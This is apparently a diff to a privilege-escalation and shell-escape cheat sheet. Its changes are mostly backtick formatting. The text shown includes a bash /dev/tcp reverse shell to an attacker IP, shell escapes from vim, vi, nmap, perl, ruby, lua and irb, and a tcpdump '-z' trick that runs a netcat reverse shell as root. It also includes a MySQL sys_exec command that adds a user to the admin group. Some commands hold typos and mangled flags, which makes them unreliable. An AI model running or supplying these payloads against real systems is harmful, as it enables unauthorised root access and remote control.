@@ -17,22 +17,16 @@ bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -l
 echo os.system('/bin/bash')
 OR        
 `/bin/sh -i`
-
 OR        
-:! /bin/bash
-
+`:! /bin/bash`
 OR        
 `':!bash':`   //from vim
-
 OR        
 `:!bash`    // from vi
-
 OR        
 `!sh`    //from nmap
 
-
 Plesse check below:
-
 `:set shell=/bin/bash:shell`
 
 echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root      //from tcpdump
@@ -62,8 +56,8 @@ perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 irb(main:001:0> exec "/bin/sh" 
-lua: `os.execute('/bin/sh')`
-`exec "/bin/sh"`     // from IRB
+lua: ``os.execute('/bin/sh')``
+``exec "/bin/sh"``    // from IRB
 select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su and inser john's password.
 
 First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
